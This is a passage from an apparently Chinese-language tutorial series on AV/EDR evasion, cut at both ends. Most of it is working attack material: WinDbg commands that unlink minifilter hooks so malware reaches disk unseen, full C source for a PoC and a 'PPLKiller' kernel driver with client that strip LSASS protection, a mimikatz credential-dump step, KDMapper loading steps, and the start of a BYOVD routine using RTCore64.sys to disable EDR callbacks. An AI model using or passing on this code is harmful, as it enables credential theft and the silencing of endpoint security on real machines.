<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs windbg">eq &lt;Previous_Node_Flink&gt; &lt;Next_Node&gt;<br>eq &lt;Next_Node_Blink&gt; &lt;Previous_Node&gt;<br>eq &lt;Current_Node_Flink&gt; &lt;Current_Node&gt;<br>eq &lt;Current_Node_Blink&gt; &lt;Current_Node&gt;<br></code></pre></td></tr></table></figure>

<p>这会断开minifilter钩子，允许恶意软件被写入磁盘而不被检测。</p>
<hr>
<h3 id="4-实际场景"><a href="#4-实际场景" class="headerlink" title="4. 实际场景"></a><strong>4. 实际场景</strong></h3><h3 id="完整流程："><a href="#完整流程：" class="headerlink" title="完整流程："></a><strong>完整流程</strong>：</h3><ol>
<li><p>使用WinDbg对<code>lsass.exe</code>的EPROCESS进行补丁，移除其保护。</p>
</li>
<li><p>使用<code>mimikatz</code>从LSASS内存中转储凭证。</p>
</li>
<li><p>要在没有AV警报的情况下将<code>mimikatz</code>写入磁盘：</p>
<ul>
<li><p>按照上述方法解除文件回调的钩子。</p>
</li>
<li><p>或者，从内存加载<code>mimikatz</code>或动态打包它。</p>
</li>
</ul>
</li>
</ol>
<hr>
<h3 id="PPL绕过通过EPROCESS补丁-–-内核读-写PoC"><a href="#PPL绕过通过EPROCESS补丁-–-内核读-写PoC" class="headerlink" title="PPL绕过通过EPROCESS补丁 – 内核读&#x2F;写PoC"></a><strong>PPL绕过通过EPROCESS补丁 – 内核读&#x2F;写PoC</strong></h3><blockquote>
<p>本代码假设你已经拥有一个易受攻击的驱动（如<code>RTCore64.sys</code>、<code>Capcom.sys</code>或<code>AsusVGP.sys</code>），该驱动暴露了对任意内核内存的<strong>读</strong>和<strong>写</strong>原语。</p>
</blockquote>
<hr>
<h3 id="步骤1：识别EPROCESS偏移和目标"><a href="#步骤1：识别EPROCESS偏移和目标" class="headerlink" title="步骤1：识别EPROCESS偏移和目标"></a><strong>步骤1：识别EPROCESS偏移和目标</strong></h3><p>你需要以下信息：</p>
<table>
<thead>
<tr>
<th>字段</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>PsInitialSystemProcess</td>
<td>用于遍历进程列表的导出</td>
</tr>
<tr>
<td>ActiveProcessLinks</td>
<td>用于枚举EPROCESS结构的列表</td>
</tr>
<tr>
<td>ImageFileName</td>
<td>进程名（例如，<code>lsass.exe</code>）</td>
</tr>
<tr>
<td>Protection</td>
<td>我们要补丁的字段，设置为0（移除PPL）</td>
</tr>
</tbody></table>
<p>使用WinDbg查找<code>Protection</code>字段在<code>_EPROCESS</code>中的偏移：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">dt _EPROCESS<br>dt _EPROCESS Protection<br></code></pre></td></tr></table></figure>

<p>通常，<code>Protection</code>字段位于<code>0x87A</code>附近，具体偏移取决于操作系统版本。</p>
<hr>
<h3 id="步骤2：PoC代码（用户态应用调用驱动）"><a href="#步骤2：PoC代码（用户态应用调用驱动）" class="headerlink" title="步骤2：PoC代码（用户态应用调用驱动）"></a><strong>步骤2：PoC代码（用户态应用调用驱动）</strong></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;TlHelp32.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IOCTL_WRITE_MEMORY CTL_CODE(FILE_DEVICE_UNKNOWN, 0x2220B, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">KERNEL_WRITE_REQUEST</span> &#123;</span><br>    ULONG_PTR Address;<br>    ULONG_PTR Value;<br>    SIZE_T Size;<br>&#125; KERNEL_WRITE_REQUEST;<br><br>DWORD <span class="hljs-title function_">GetProcessIdByName</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">wchar_t</span>* name)</span> &#123;<br>    PROCESSENTRY32W entry;<br>    entry.dwSize = <span class="hljs-keyword">sizeof</span>(entry);<br>    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (Process32FirstW(snapshot, &amp;entry)) &#123;<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-keyword">if</span> (_wcsicmp(entry.szExeFile, name) == <span class="hljs-number">0</span>) &#123;<br>                CloseHandle(snapshot);<br>                <span class="hljs-keyword">return</span> entry.th32ProcessID;<br>            &#125;<br>        &#125; <span class="hljs-keyword">while</span> (Process32NextW(snapshot, &amp;entry));<br>    &#125;<br>    CloseHandle(snapshot);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>ULONG_PTR <span class="hljs-title function_">GetEPROCESSAddr</span><span class="hljs-params">(DWORD pid)</span> &#123;<br>    <span class="hljs-comment">// 这是特定于上下文的。</span><br>    <span class="hljs-comment">// 在实际使用中，应通过遍历PsActiveProcessHead或使用暴露的IOCTL来解决EPROCESS地址</span><br><br>    <span class="hljs-comment">// 占位地址：</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0xFFFFA88A00000000</span>; <span class="hljs-comment">// 你必须从漏洞驱动中解决实际的EPROCESS地址</span><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    HANDLE hDriver = CreateFileW(<span class="hljs-string">L&quot;\\\\.\\MyVulnDriver&quot;</span>,<br>        GENERIC_READ | GENERIC_WRITE,<br>        <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, OPEN_EXISTING, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-keyword">if</span> (hDriver == INVALID_HANDLE_VALUE) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] 打开易受攻击驱动的句柄失败。\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    DWORD lsassPid = GetProcessIdByName(<span class="hljs-string">L&quot;lsass.exe&quot;</span>);<br>    <span class="hljs-keyword">if</span> (!lsassPid) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] 找不到lsass.exe进程。\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    ULONG_PTR eprocess = GetEPROCESSAddr(lsassPid);<br>    ULONG_PTR protectionOffset = <span class="hljs-number">0x87A</span>; <span class="hljs-comment">// 根据操作系统版本调整</span><br><br>    KERNEL_WRITE_REQUEST request = &#123;<br>        .Address = eprocess + protectionOffset,<br>        .Value = <span class="hljs-number">0x00</span>, <span class="hljs-comment">// 移除保护</span><br>        .Size = <span class="hljs-number">1</span><br>    &#125;;<br><br>    DWORD bytesReturned;<br>    BOOL result = DeviceIoControl(hDriver,<br>        IOCTL_WRITE_MEMORY,<br>        &amp;request, <span class="hljs-keyword">sizeof</span>(request),<br>        <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, &amp;bytesReturned, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-keyword">if</span> (!result) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] 补丁保护失败。\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] LSASS保护已移除。现在可以打开句柄。\n&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="步骤3：使用Mimikatz测试"><a href="#步骤3：使用Mimikatz测试" class="headerlink" title="步骤3：使用Mimikatz测试"></a><strong>步骤3：使用Mimikatz测试</strong></h3><p>在运行PoC后：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">mimikatz # sekurlsa::logonpasswords<br></code></pre></td></tr></table></figure>

<p>你应该不再看到：</p>
<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs subunit"><span class="hljs-keyword">ERROR </span>kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="重要注意事项"><a href="#重要注意事项" class="headerlink" title="重要注意事项"></a><strong>重要注意事项</strong></h3><ul>
<li><p>此PoC假设：</p>
<ul>
<li>你已经拥有任意内核内存<strong>写</strong>权限（例如，通过&#96;Capcom.sys</li>
</ul>
</li>
</ul>
<p><code>、</code>RTCore64.sys<code>）。 - 你已经手动解决了</code>lsass.exe<code>的EPROCESS（可以通过内核模式中的</code>PsLookupProcessByPid&#96;或通过暴露的IOCTL来自动化）。</p>
<ul>
<li><p>保护值<code>0x00</code> &#x3D; 无保护。其他值：</p>
<ul>
<li><p><code>0x61</code> → PsProtectedSignerLsa-Light</p>
</li>
<li><p><code>0x62</code> → PsProtectedSignerAntimalware-Light</p>
</li>
</ul>
</li>
</ul>
<hr>
<h3 id="内核模式驱动：PPLKillerDrv-c"><a href="#内核模式驱动：PPLKillerDrv-c" class="headerlink" title="内核模式驱动：PPLKillerDrv.c"></a><strong>内核模式驱动：<code>PPLKillerDrv.c</code></strong></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ntddk.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windef.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IOCTL_DISABLE_PROTECTION CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IOCTL_REQUEST</span> &#123;</span><br>    ULONG TargetPid;<br>&#125; IOCTL_REQUEST, *PIOCTL_REQUEST;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">PS_PROTECTION</span> &#123;</span><br>    UCHAR Type : <span class="hljs-number">3</span>;<br>    UCHAR Audit : <span class="hljs-number">1</span>;<br>    UCHAR Signer : <span class="hljs-number">4</span>;<br>&#125; PS_PROTECTION, *PPS_PROTECTION;<br><br>PDEVICE_OBJECT g_DeviceObj = <span class="hljs-literal">NULL</span>;<br>UNICODE_STRING g_DeviceName = RTL_CONSTANT_STRING(<span class="hljs-string">L&quot;\\Device\\PPLKiller&quot;</span>);<br>UNICODE_STRING g_SymbolicLink = RTL_CONSTANT_STRING(<span class="hljs-string">L&quot;\\??\\PPLKiller&quot;</span>);<br><br>NTSTATUS <span class="hljs-title function_">UnloadDriver</span><span class="hljs-params">(PDRIVER_OBJECT DriverObject)</span> &#123;<br>    IoDeleteSymbolicLink(&amp;g_SymbolicLink);<br>    IoDeleteDevice(g_DeviceObj);<br>    DbgPrint(<span class="hljs-string">&quot;PPLKiller卸载。\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> STATUS_SUCCESS;<br>&#125;<br><br>NTSTATUS <span class="hljs-title function_">DispatchDeviceControl</span><span class="hljs-params">(PDEVICE_OBJECT DeviceObject, PIRP Irp)</span> &#123;<br>    PIO_STACK_LOCATION <span class="hljs-built_in">stack</span> = IoGetCurrentIrpStackLocation(Irp);<br>    ULONG controlCode = <span class="hljs-built_in">stack</span>-&gt;Parameters.DeviceIoControl.IoControlCode;<br>    NTSTATUS status = STATUS_INVALID_DEVICE_REQUEST;<br>    ULONG info = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">if</span> (controlCode == IOCTL_DISABLE_PROTECTION) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">stack</span>-&gt;Parameters.DeviceIoControl.InputBufferLength &lt; <span class="hljs-keyword">sizeof</span>(IOCTL_REQUEST)) &#123;<br>            status = STATUS_BUFFER_TOO_SMALL;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            PIOCTL_REQUEST req = (PIOCTL_REQUEST)Irp-&gt;AssociatedIrp.SystemBuffer;<br>            PEPROCESS targetProcess = <span class="hljs-literal">NULL</span>;<br><br>            <span class="hljs-keyword">if</span> (NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)req-&gt;TargetPid, &amp;targetProcess))) &#123;<br>                PUCHAR eprocessBytes = (PUCHAR)targetProcess;<br><br>                <span class="hljs-comment">// 保护字段的偏移 – 需要根据版本验证！</span><br>                SIZE_T protectionOffset = <span class="hljs-number">0x87A</span>;<br><br>                PS_PROTECTION* protection = (PS_PROTECTION*)(eprocessBytes + protectionOffset);<br>                DbgPrint(<span class="hljs-string">&quot;原始保护：0x%02X\n&quot;</span>, *(PUCHAR)protection);<br><br>                *(PUCHAR)protection = <span class="hljs-number">0x00</span>; <span class="hljs-comment">// 移除PPL</span><br><br>                DbgPrint(<span class="hljs-string">&quot;已为PID %lu移除PPL。\n&quot;</span>, req-&gt;TargetPid);<br>                ObDereferenceObject(targetProcess);<br>                status = STATUS_SUCCESS;<br>                info = <span class="hljs-keyword">sizeof</span>(IOCTL_REQUEST);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                DbgPrint(<span class="hljs-string">&quot;无法找到目标进程。\n&quot;</span>);<br>                status = STATUS_NOT_FOUND;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    Irp-&gt;IoStatus.Status = status;<br>    Irp-&gt;IoStatus.Information = info;<br>    IoCompleteRequest(Irp, IO_NO_INCREMENT);<br>    <span class="hljs-keyword">return</span> status;<br>&#125;<br><br>NTSTATUS <span class="hljs-title function_">DriverEntry</span><span class="hljs-params">(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)</span> &#123;<br>    UNREFERENCED_PARAMETER(RegistryPath);<br><br>    DriverObject-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchDeviceControl;<br>    DriverObject-&gt;DriverUnload = UnloadDriver;<br><br>    NTSTATUS status = IoCreateDevice(<br>        DriverObject,<br>        <span class="hljs-number">0</span>,<br>        &amp;g_DeviceName,<br>        FILE_DEVICE_UNKNOWN,<br>        <span class="hljs-number">0</span>,<br>        FALSE,<br>        &amp;g_DeviceObj<br>    );<br><br>    <span class="hljs-keyword">if</span> (!NT_SUCCESS(status)) &#123;<br>        <span class="hljs-keyword">return</span> status;<br>    &#125;<br><br>    status = IoCreateSymbolicLink(&amp;g_SymbolicLink, &amp;g_DeviceName);<br>    <span class="hljs-keyword">if</span> (!NT_SUCCESS(status)) &#123;<br>        IoDeleteDevice(g_DeviceObj);<br>        <span class="hljs-keyword">return</span> status;<br>    &#125;<br><br>    DbgPrint(<span class="hljs-string">&quot;PPLKiller加载。\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> STATUS_SUCCESS;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="用户态应用：PPLKillerClient-c"><a href="#用户态应用：PPLKillerClient-c" class="headerlink" title="用户态应用：PPLKillerClient.c"></a><strong>用户态应用：<code>PPLKillerClient.c</code></strong></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IOCTL_DISABLE_PROTECTION CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IOCTL_REQUEST</span> &#123;</span><br>    ULONG TargetPid;<br>&#125; IOCTL_REQUEST;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)</span> &#123;<br>    <span class="hljs-keyword">if</span> (argc &lt; <span class="hljs-number">2</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;用法：%s &lt;PID&gt;\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    DWORD pid = atoi(argv[<span class="hljs-number">1</span>]);<br><br>    HANDLE hDevice = CreateFileW(<span class="hljs-string">L&quot;\\\\.\\PPLKiller&quot;</span>,<br>        GENERIC_WRITE | GENERIC_READ,<br>        <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, OPEN_EXISTING, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-keyword">if</span> (hDevice == INVALID_HANDLE_VALUE) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] 打开驱动句柄失败。\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    IOCTL_REQUEST req = &#123; .TargetPid = pid &#125;;<br>    DWORD bytesReturned;<br><br>    <span class="hljs-keyword">if</span> (DeviceIoControl(hDevice, IOCTL_DISABLE_PROTECTION,<br>        &amp;req, <span class="hljs-keyword">sizeof</span>(req),<br>        <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, &amp;bytesReturned, <span class="hljs-literal">NULL</span>)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] 已移除PID %lu的PPL\n&quot;</span>, pid);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] IOCTL失败：%lu\n&quot;</span>, GetLastError());<br>    &#125;<br><br>    CloseHandle(hDevice);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="编译说明"><a href="#编译说明" class="headerlink" title="编译说明"></a>编译说明</h3><ul>
<li><p>使用Windows驱动程序工具包（WDK）编译<strong>驱动</strong>。</p>
</li>
<li><p>使用MSVC编译器（如Visual Studio）编译<strong>客户端</strong>。</p>
</li>
<li><p>使用<strong>OSR Loader</strong>、<strong>KDMapper</strong>或<strong>手动映射</strong>加载驱动。</p>
</li>
<li><p>使用<strong>进程ID</strong>运行客户端，如：</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">PPLKillerClient.exe 720<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="安全注意事项"><a href="#安全注意事项" class="headerlink" title="安全注意事项"></a>安全注意事项</h3><ul>
<li><p><strong>补丁内核内存</strong>需要小心偏移并进行构建特定的测试。</p>
</li>
<li><p>始终在<strong>安全的虚拟机环境</strong>中测试，绝不在生产系统上运行。</p>
</li>
<li><p>现代EDR如果没有隐蔽处理，可能会检测到这些技术（考虑使用DSE补丁或驱动隐藏技术）。</p>
</li>
</ul>
<hr>
<h3 id="附加参考资料"><a href="#附加参考资料" class="headerlink" title="附加参考资料"></a><strong>附加参考资料</strong></h3><ul>
<li><p><a target="_blank" rel="noopener" href="https://github.com/itm4n/PPLdump">PPLdump</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/hfiref0x/KDU">KDU</a> 用于内核内存写操作</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://0xv1n.github.io/posts/processprotection/">EPROCESS 和 PS_PROTECTION</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ifs/filter-manager-concepts">Minifilter架构</a></p>
</li>
</ul>
<h2 id="AV-EDR规避技术-8-4-通过BYOVD（Bring-Your-Own-Vulnerable-Driver）杀死EDR"><a href="#AV-EDR规避技术-8-4-通过BYOVD（Bring-Your-Own-Vulnerable-Driver）杀死EDR" class="headerlink" title="AV&#x2F;EDR规避技术 - 8.4 - 通过BYOVD（Bring Your Own Vulnerable Driver）杀死EDR"></a><strong>AV&#x2F;EDR规避技术 - 8.4 - 通过BYOVD（Bring Your Own Vulnerable Driver）杀死EDR</strong></h2><p><strong>Bring Your Own Vulnerable Driver (BYOVD)</strong> 是一种广泛使用的攻击技术，利用合法、签名但存在漏洞的内核模式驱动程序来执行特权操作，如禁用安全产品、修改内核内存或提升权限。这种方式绕过了驱动程序签名强制（DSE），并避免了触发早期检测机制，因为驱动程序本身已经被Windows信任。</p>
<hr>
<h4 id="目标-2"><a href="#目标-2" class="headerlink" title="目标"></a><strong>目标</strong></h4><p>使用脆弱的签名驱动程序杀死或禁用内核或用户空间中的EDR组件。通常通过以下方式实现：</p>
<ul>
<li><p>禁用进程保护（<code>PPL</code>，<code>ETW</code>，回调）。</p>
</li>
<li><p>卸载或清空由EDR内核驱动程序注册的回调。</p>
</li>
<li><p>从内核直接终止EDR用户空间进程。</p>
</li>
<li><p>覆盖敏感结构，如 <code>EPROCESS</code>、<code>ObjectTypeInitializers</code>、<code>Callbacks</code> 或 <code>PsSetCreateProcessNotifyRoutine</code>。</p>
</li>
</ul>
<hr>
<h3 id="步骤：实际使用-RTCore64-sys（MSI）"><a href="#步骤：实际使用-RTCore64-sys（MSI）" class="headerlink" title="步骤：实际使用 RTCore64.sys（MSI）"></a>步骤：实际使用 <code>RTCore64.sys</code>（MSI）</h3><p>最常见的BYOVD例子之一是 <strong>RTCore64.sys</strong>，它是MSI的超频工具中使用的签名驱动程序。这个驱动程序允许在没有任何安全检查的情况下执行任意的内核内存读取和写入操作。</p>
<hr>
<h4 id="步骤-1-–-加载脆弱驱动程序"><a href="#步骤-1-–-加载脆弱驱动程序" class="headerlink" title="步骤 1 – 加载脆弱驱动程序"></a><strong>步骤 1 – 加载脆弱驱动程序</strong></h4><p>你可以使用加载器，如 <a target="_blank" rel="noopener" href="https://github.com/TheCruZ/kdmapper">KDMapper</a> 来加载 <code>RTCore64.sys</code> 到Windows中：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kdmapper.exe RTCore64.sys<br></code></pre></td></tr></table></figure>

<p>这将把驱动程序映射到内核内存中，而无需证书或修改启动设置。</p>
<hr>
<h4 id="步骤-2-–-使用它来修改内核结构"><a href="#步骤-2-–-使用它来修改内核结构" class="headerlink" title="步骤 2 – 使用它来修改内核结构"></a><strong>步骤 2 – 使用它来修改内核结构</strong></h4><p>下面是一个使用 <code>RTCore64.sys</code> 执行任意内核内存写入并禁用EDR相关回调的例子。</p>
<h5 id="代码示例（C-）-–-修改-PsSetCreateProcessNotifyRoutine-回调表"><a href="#代码示例（C-）-–-修改-PsSetCreateProcessNotifyRoutine-回调表" class="headerlink" title="代码示例（C++） – 修改 PsSetCreateProcessNotifyRoutine 回调表"></a>代码示例（C++） – 修改 <code>PsSetCreateProcessNotifyRoutine</code> 回调表</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">define</span> IOCTL_WRITE_KERNEL_MEMORY 0x22200C</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_KERNEL_WRITE_REQUEST</span> &#123;<br>    ULONGLONG Address;<br>    ULONGLONG Value;<br>    SIZE_T Size;<br>&#125; KERNEL_WRITE_REQUEST;<br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">WriteKernelMemory</span><span class="hljs-params">(HANDLE hDriver, ULONGLONG address, ULONGLONG value, SIZE_T size)</span> </span>&#123;<br>    KERNEL_WRITE_REQUEST req = &#123; address, value, size &#125;;<br>    DWORD bytesReturned;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">DeviceIoControl</span>(hDriver,<br>        